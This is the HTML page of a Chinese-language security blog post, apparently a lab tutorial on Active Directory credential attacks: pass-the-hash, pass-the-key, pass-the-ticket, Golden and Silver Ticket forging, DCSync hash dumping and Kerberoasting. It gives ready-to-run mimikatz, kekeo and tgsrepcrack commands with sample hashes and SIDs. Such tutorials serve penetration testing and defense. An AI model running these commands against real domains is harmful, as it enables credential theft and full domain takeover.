@@ -1,0 +1,1024 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )在windows系统中,系统通常不会存储用户登录密码,而是存储密码的哈希值. 在我们远程登录系统的时候,实际上向远程传递的就是密码的hash值。 当攻击者获取了存储在计算机上的用户名和密码的hash值的时候(PWDUMP7等) 他虽然不知道密码值,但是仍然可以通过直接连接远程主机,通过传送密码的has">
+<meta name="keywords" content="域渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透之票据">
+<meta property="og:url" content="https://wh0ale.github.io/2018/12/25/2018-12-25-域渗透之票据/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )在windows系统中,系统通常不会存储用户登录密码,而是存储密码的哈希值. 在我们远程登录系统的时候,实际上向远程传递的就是密码的hash值。 当攻击者获取了存储在计算机上的用户名和密码的hash值的时候(PWDUMP7等) 他虽然不知道密码值,但是仍然可以通过直接连接远程主机,通过传送密码的has">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fz74hk4llxj21940w6gpa.jpg">
+<meta property="og:image" content="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/Kerberos.png">
+<meta property="og:image" content="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/pass-the-ticket.png">
+<meta property="og:image" content="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/Golden_Ticket1.png">
+<meta property="og:image" content="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/Golden_Ticket2.png">
+<meta property="og:image" content="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/Silver_Ticket1.png">
+<meta property="og:image" content="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/getspn.png">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.385Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="域渗透之票据">
+<meta name="twitter:description" content="Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )在windows系统中,系统通常不会存储用户登录密码,而是存储密码的哈希值. 在我们远程登录系统的时候,实际上向远程传递的就是密码的hash值。 当攻击者获取了存储在计算机上的用户名和密码的hash值的时候(PWDUMP7等) 他虽然不知道密码值,但是仍然可以通过直接连接远程主机,通过传送密码的has">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fz74hk4llxj21940w6gpa.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2018/12/25/2018-12-25-域渗透之票据/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>域渗透之票据 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2018/12/25/2018-12-25-域渗透之票据/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">域渗透之票据
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-25 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-25T00:00:00+08:00">2018-12-25</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">22k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">20 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fz74hk4llxj21940w6gpa.jpg" alt></p>
+<h2 id="Pass-the-Hash-PTH-hash传递攻击-即-Mimikatz-hash注入"><a href="#Pass-the-Hash-PTH-hash传递攻击-即-Mimikatz-hash注入" class="headerlink" title="Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )"></a>Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )</h2><p>在windows系统中,系统通常不会存储用户登录密码,而是<strong>存储密码的哈希值.</strong></p>
+<p>在我们远程登录系统的时候,实际上向远程传递的就是密码的hash值。</p>
+<p>当攻击者获取了存储在计算机上的用户名和密码的hash值的时候(PWDUMP7等)</p>
+<p>他虽然不知道密码值,但是仍然可以通过直接连接远程主机,通过传送密码的hash值来达到登录的目的。</p>
+<p>工具:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a. Metasploit - exploit/windows/smb/psexec (XP,2003)</span><br><span class="line">b. xfreerdp (2012r2 http://www.freebuf.com/articles/system/15757.html Hash传递攻击登陆Windows2012远程桌面)</span><br><span class="line">    微软在2014年发布了KB2871997和KB2928120两个补丁,用来阻止域内主机本地用户的网络登录,本地用户的PTH方式已经死掉</span><br><span class="line">然而 , mimikatz实现了在禁用NTLM的环境下仍然可以远程连接。</span><br><span class="line">c.hash injection</span><br><span class="line">    mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">    mimikatz <span class="comment"># sekurlsa::pth /user:administrator /domain:workgroup /ntlm:d6e1371929886ec1be0b0cf4b101f289 /run:c:\windows\system32\cmd.exe</span></span><br><span class="line">(sekurlsa::pth 中的pth 即Pass the Hash)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Pass-The-Key-OverPass-the-Hash"><a href="#Pass-The-Key-OverPass-the-Hash" class="headerlink" title="Pass The Key (OverPass-the-Hash)"></a>Pass The Key (OverPass-the-Hash)</h2><p><strong>当系统安装了KB2871997补丁且禁用了NTLM的时候，那我们抓取到的ntlm hash</strong></p>
+<p>也就失去了作用，但是可以通过pass the key的攻击方式获得权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::ekeys"</span> 获取用户的aes key</span><br><span class="line">mimikatz <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::pth /user:用戶a /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c"</span> 注入aes key</span><br></pre></td></tr></table></figure>
+
+<p>若dir 查看不了服务器 (测试2008r2域服务器)</p>
+<p>查看mimikatz的相关资料发现如下信息:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntlm <span class="built_in">hash</span> is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable) ; AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, <span class="keyword">in</span> this <span class="keyword">case</span> you can avoid ntlm <span class="built_in">hash</span>.</span><br></pre></td></tr></table></figure>
+
+<p>根据提示，尝试在系统安装补丁kb2871997后继续测试<br>安裝 : <a href="https://www.microsoft.com/en-us/download/details.aspx?id=42765" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=42765</a><br>之后可以用\计算机名的方式通过远程共享查看目标机器(ps:这里必须要使用计算机名进行连接，会爆密码错误。 不要用win10测试，win10机器测试会在一分鐘后重啓 ,)<br>(如果获取的散列是NTLM，则Kerberos凭证加密方法是RC4。如果散列加密方法为AES，则Kerberos票使用AES进行的加密。)</p>
+<h2 id="Pass-the-Ticket-票据传递攻击PtT"><a href="#Pass-the-Ticket-票据传递攻击PtT" class="headerlink" title="Pass the Ticket (票据传递攻击PtT)"></a>Pass the Ticket (票据传递攻击PtT)</h2><p><a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/Kerberos.png" target="_blank" rel="noopener"><img src="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/Kerberos.png" alt="Kerberos.png"></a></p>
+<p>简义</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知道用户的ntlm值，由kekeo生成TGT票据，之后导入票据即可</span><br></pre></td></tr></table></figure>
+
+<p>与PtH情况类似,但PtT使用的是Kerberos票据,而不是NT哈希</p>
+<p><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos</a></p>
+<p>在微软活动目录中颁发的<strong>TGT是可移植的。由于Kerberos的无状态特性,TGT</strong>中并没有关于票据来源的标识信息。</p>
+<p>这意味着可以从某台计算机上导出一个有效的TGT,然后导入到该环境中其他的计算机上。</p>
+<p><strong>新导入的票据可以用于域的身份认证,并拥有票据中指定用户的权限来访问网络资源。</strong></p>
+<p><strong>这种特别的攻击方法被称为”pass-the-ticket”攻击。</strong></p>
+<p><a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/pass-the-ticket.png" target="_blank" rel="noopener"><img src="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/pass-the-ticket.png" alt="pass-the-ticket.png"></a></p>
+<p>拿到了域控权限,在上面就可以很容易的获得krbtgt的Hash值,再通过mimikatz即可生成任意用户任何权限的Ticket,也就是Golden Ticket</p>
+<p>考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket</p>
+<p>Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo : <a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a></p>
+<p>执行后生成票据<a href="mailto:TGT_test1@TEST.LOCA" target="_blank" rel="noopener">TGT_test1@TEST.LOCA</a><a href="mailto:L_krbtgt~test.local@TEST.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~test.local@TEST.LOCAL.kirbi</a> :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo <span class="string">"tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1"</span></span><br></pre></td></tr></table></figure>
+
+<p>导入票据：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo <span class="string">"kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi"</span></span><br></pre></td></tr></table></figure>
+
+<p>以上3种:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hash传递攻击(PtH):抓住哈希并使用它来访问资源。用户更改帐户密码之前有效。</span><br><span class="line">凭证传递攻击(PtT):抓取Kerberos凭证，并且使用它进行访问资源。攻击有效期是在票证有效期之内(一般为7天)。</span><br><span class="line">超hash传递攻击(OPtH / PtK):使用密码哈希来获取Kerberos凭证。用户更改帐户密码之前，哈希才有效。</span><br></pre></td></tr></table></figure>
+
+<h2 id="Golden-Ticket-黄金票据"><a href="#Golden-Ticket-黄金票据" class="headerlink" title="Golden Ticket (黄金票据)"></a>Golden Ticket (黄金票据)</h2><p>简义 : 在拥有普通域用户权限和 krbtgt账号的hash的情况下,获取域管理员权限。</p>
+<p>发生在上面的过程3,可以伪造TGT(前提是获取krbtgt账号的口令散列值(hash))，宣称自己是域内任何账号，包括域管或者不存在的用户。</p>
+<p>由來:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Kerberos信任及完全依赖于KDC密码,由于Kerberos协议是无状态的,因此密钥分发中心KDC和票据授予服务TGS并没记录以前的交互信息。</span><br><span class="line">因此票据授予服务所需使用的全部信息都位于TGT票据中。因为TGT使用krbtgt的密钥加密过,</span><br><span class="line">理论上讲网络上只有两方能够解密TGT:</span><br><span class="line">    颁发票据的KDC和接受票据并创建访问网络资源的服务票据的票据授予服务TGS。</span><br><span class="line">    这种情况让krbtgt成为系统中最重要的密码。最终结果是只要TGT被krbtgt账户密码正确地加密,TGT中的所有信息都是可信的。</span><br></pre></td></tr></table></figure>
+
+<p><strong>如果攻击者能够攻陷KDC和提取krbtgt散列值(hash)。</strong>然后利用这些有限信息,攻击者能够为委托人principal生成任意的TGT。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1. 首先,黄金票据是全功能的TGT。也就意味着万能票据可用于Kerberos认证的任何服务。票据授予服务盲目地相信TGT中的信息,然后处理TGT并颁发服务票据。</span><br><span class="line">内存中插入黄金票据并不需要提升权限。而且默认情况下,黄金票据的有效期是10年。</span><br><span class="line"></span><br><span class="line">2. 其次,　黄金票据可以用来绕过当前Kerberos有关加密策略的要求。</span><br><span class="line">例如,可以使用DES或RC4加密算法创建一个TGT,即使该域明确支持AES,禁止使用DES或RC4。</span><br><span class="line">此情况会产生一个有趣的现象: TGT使用DES加密而服务票据使用AES加密。</span><br><span class="line">票据授予服务似乎并不担心TGT,也不拒绝异常行为,因为没有机制让票据授予服务报告关于策略的错误。</span><br><span class="line"></span><br><span class="line">3. 再次,黄金票据并没启用任何高级账户策略的设置。微软添加了一个功能来验证服务票据的请求,以确保已禁用的TGT不能用于获得服务票据。</span><br><span class="line">然而,该功能的实现存在问题。只有当TGT的寿命超过20分钟时,票据授予服务才会验证TGT的有效性。</span><br><span class="line">如果TGT的寿命低于20分钟,票据授予服务将直接颁发服务票据,而不去验证TGT的有效性,默认情况下服务票据具有10小时的有效期。</span><br><span class="line">因为攻击者可以利用Mimikatz工具随心所欲的产生票据,所以攻击者只需清除旧的TGT,再替换为寿命少于20分钟的新票据,轻松突破20分钟的限制条件。</span><br><span class="line"></span><br><span class="line">4. 最终,黄金票据可以被配置成任意用户和任意组的成员。这也可以创建一个票据,票据中任何用户都可以是任意组的成员。</span><br><span class="line">这可以用来绕过文件服务器或其他应用程序上基于用户组的访问限制。黄金票据中的用户和SID不必在活动目录中真实存在。</span><br><span class="line">也就意味着可以为域中不存在的用户创建TGT,并仍然可以在TGT生命周期内前20分钟内从票据授予服务获得服务票据。</span><br><span class="line"></span><br><span class="line">5. 所需条件:</span><br><span class="line">    5.1 krbtgt账户的NT-Hash - 该散列值仅位于域控服务器的活动目录中。所以攻击者必须攻陷域控服务器并提权至管理员权限</span><br><span class="line">    5.2 域账户名称 - 通常是域管理员&quot;domain admin&quot;</span><br><span class="line">    5.3 域名</span><br><span class="line">    5.4 域SID - 可以从域用户的SID或通过sysinternal中psGetsid.exe获得</span><br><span class="line"></span><br><span class="line">6 简单过程:</span><br><span class="line">    6.1 清空缓存证书</span><br><span class="line">    kerberos::purge  ( or klist purge)</span><br><span class="line">    6.2 手动创建了一张域管理的黄金票据</span><br><span class="line">    kerberos::golden /admin:administrator /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /krbtgt:3f65c6984cbfebdc5f17986d07620afb /ticket:administrator.kirbi.bin</span><br><span class="line">    6.3 使用这张票据</span><br><span class="line">    kerberos::ptt administrator.kirbi.bin</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/Golden_Ticket1.png" target="_blank" rel="noopener"><img src="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/Golden_Ticket1.png" alt="Golden_Ticket1"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">6.4 然后我的低权限本地用户，就被提升到域管理权限</span><br><span class="line">kerberos::list</span><br><span class="line">6.5 利用dcsync功能获取hash,通过DRSR(目录复制服务DRS远程协议)协议，从域控制器获取任何用户的hash</span><br><span class="line">lsadump::dcsync /domain:demo.local /user:testwin10  (administrator / testwin7)</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/Golden_Ticket2.png" target="_blank" rel="noopener"><img src="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/Golden_Ticket2.png" alt="Golden_Ticket2"></a></p>
+<h2 id="Silver-Ticket-白银票据"><a href="#Silver-Ticket-白银票据" class="headerlink" title="Silver Ticket (白银票据)"></a>Silver Ticket (白银票据)</h2><p>简义 : 发生在上面的过程5，可以伪造TGS(<strong>前提是获取服务账号的口令散列值</strong>)，宣称自己是域内任何账号，例如域管。</p>
+<p>Silver Ticket生成时指定了相关的服务名，因此只能用来访问相应的服务，所以局限性比较大，没有golden ticket好用</p>
+<p>所需条件(mimikatz生成silver ticket)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. /domain</span><br><span class="line">2. /sid            ( S-1-5-21-1239069908-882060383-2558203358-500 注意:不要後面的-500  )</span><br><span class="line">3. /target:域控全称</span><br><span class="line">4. /service:目标服务器上面的kerberos服务，此处为cifs</span><br><span class="line">5. /rc4:域控的计算机账户ntlm hash</span><br><span class="line">6. /user:要伪造的用户名(可以不存在也可是存在的)</span><br><span class="line">7. mimikatz.exe &quot;kerberos::golden /domain:域 /sid:SID /target:域全称 /service:要访问的服务 /rc4:NTLM /user:silver /ptt&quot;即可生成并导入Silver Ticket</span><br></pre></td></tr></table></figure>
+
+<p>常用的服务名有以下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">服务名称                    同时需要的服务</span><br><span class="line">WMI                        HOST、RPCSS</span><br><span class="line">PowerShell Remoting        HOST、HTTP</span><br><span class="line">WinRM                    HOST、HTTP</span><br><span class="line">Scheduled Tasks            HOST</span><br><span class="line">Windows File Share        CIFS</span><br><span class="line">LDAP                    LDAP</span><br><span class="line">Windows Remote Server    RPCSS、LDAP、CIFS</span><br></pre></td></tr></table></figure>
+
+<p>用法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:demo.local /sid:S-1-5-21-1239069908-882060383-2558203358 /target:owa2010dc.demo.local /service:cifs /rc4:aac6185241728f7685c8d50c61573b75 /user:silver /ptt</span><br><span class="line">(/rc4:aac6185241728f7685c8d50c61573b75 這裏我用的是owa2010dc$机器賬戶的NTLM <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/Silver_Ticket1.png" target="_blank" rel="noopener"><img src="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/Silver_Ticket1.png" alt="Silver_Ticket1"></a></p>
+<h2 id="Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破"><a href="#Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破" class="headerlink" title="Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)"></a>Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)</h2><p>简义 : 发生在上面的过程3,4, <strong>目标的服务账户的服务器主体名称(SPN)请求一个Kerberos服务票据 (TGS) 。</strong></p>
+<p>这里会采用一个有效的用户认证票据(TGT)来请求一个或几个运行在服务器上的目标服务票据。</p>
+<p>域控不会检测用户是否真正连接到了这些资源上(即使用户可能真的有权限访问)。</p>
+<p>域控会在活动目录中查找SPN并且用SPN关联的用户账户把票据进行加密，以此赋予用户访问服务的权限。</p>
+<p>请求的Kerbero服务票据的加密类型是 RC4_HMAC_MD5, 这意味着服务账户的NTLM密码哈希会被用来加密服务票据。</p>
+<p>所以Kerberoast能够通过尝试不同的NTLM哈希来解开kerberos票据，一旦票据被成功解开，它的密码也就到手了。<br>(获得服务票据不需要提权，同时也不会发送数据到目标机器。)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</span><br><span class="line">python tgsrepcrack.py wordlist.txt sql.kirbi</span><br></pre></td></tr></table></figure>
+
